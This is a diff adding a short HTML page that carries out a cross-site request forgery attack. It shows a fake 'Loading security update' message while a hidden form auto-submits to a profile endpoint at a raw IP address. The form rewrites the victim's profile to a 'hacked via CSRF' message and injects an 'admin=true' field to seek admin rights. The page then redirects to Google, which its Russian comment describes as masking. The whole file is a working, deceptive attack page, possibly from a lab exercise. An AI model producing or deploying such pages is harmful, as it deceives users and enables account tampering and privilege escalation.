@@ -1,0 +1,17 @@
+<html>
+  <body>
+    <h1>Loading security update... Please wait.</h1>
+    <form id="csrfForm" action="http://51.250.73.193:5002/profile" method="POST" style="display:none;">
+      <input type="hidden" name="name" value="sly_user">
+      <input type="hidden" name="profile" value="Взлом через CSRF // Ваш профиль скомпрометирован">
+      <!-- Дополнительные скрытые поля для админ-прав (если нужно) -->
+      <input type="hidden" name="admin" value="true">
+    </form>
+    <script>
+      setTimeout(() => {
+        document.getElementById('csrfForm').submit();
+        window.location.href = "https://google.com"; // Маскировка под редирект
+      }, 2000);
+    </script>
+  </body>
+</html>
